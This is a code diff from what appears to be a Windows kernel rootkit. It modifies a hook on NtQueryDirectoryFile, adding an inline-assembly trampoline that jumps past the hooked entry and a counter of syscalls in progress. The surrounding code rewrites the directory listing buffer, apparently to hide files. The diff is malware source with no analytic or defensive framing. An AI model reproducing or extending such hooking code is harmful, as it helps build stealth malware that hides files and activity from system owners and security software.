@@ -69,7 +69,22 @@ NTSTATUS NTAPI HookNtQueryDirectoryFile(
 	PCHAR listDirBuffer;
 	ULONG_PTR newListDirLength;
 
-	retStatus = glRealNtQueryDirectoryFile(
+	//retStatus = glRealNtQueryDirectoryFile(
+	//	FileHandle,
+	//	Event,
+	//	ApcRoutine,
+	//	ApcContext,
+	//	IoStatusBlock,
+	//	FileInformation,
+	//	Length,
+	//	FileInformationClass,
+	//	ReturnSingleEntry,
+	//	FileName,
+	//	RestartScan
+	//);
+	++SyscallProcessedCount;
+
+	retStatus = JmpNtQueryDirectoryFile(
 		FileHandle,
 		Event,
 		ApcRoutine,
@@ -122,9 +137,30 @@ NTSTATUS NTAPI HookNtQueryDirectoryFile(
 
 		IoStatusBlock->Information = newListDirLength;
 	}
-
+	--SyscallProcessedCount;
 	return retStatus;
 }
+
+__declspec(naked) NTSTATUS NTAPI JmpNtQueryDirectoryFile(
+	HANDLE                 FileHandle,
+	HANDLE                 Event,
+	PIO_APC_ROUTINE        ApcRoutine,
+	PVOID                  ApcContext,
+	PIO_STATUS_BLOCK       IoStatusBlock,
+	PVOID                  FileInformation,
+	ULONG                  Length,
+	FILE_INFORMATION_CLASS FileInformationClass,
+	BOOLEAN                ReturnSingleEntry,
+	PUNICODE_STRING        FileName,
+	BOOLEAN                RestartScan
+) {
+	__asm {
+		push ebp
+		mov ebp, esp
+		jmp [addressForJmpNtNtQueryDirectoryFile]
+	}
+}
+
 
 //ULONG StrLenFilename(PCHAR str) {
 //	ULONG i = 0;
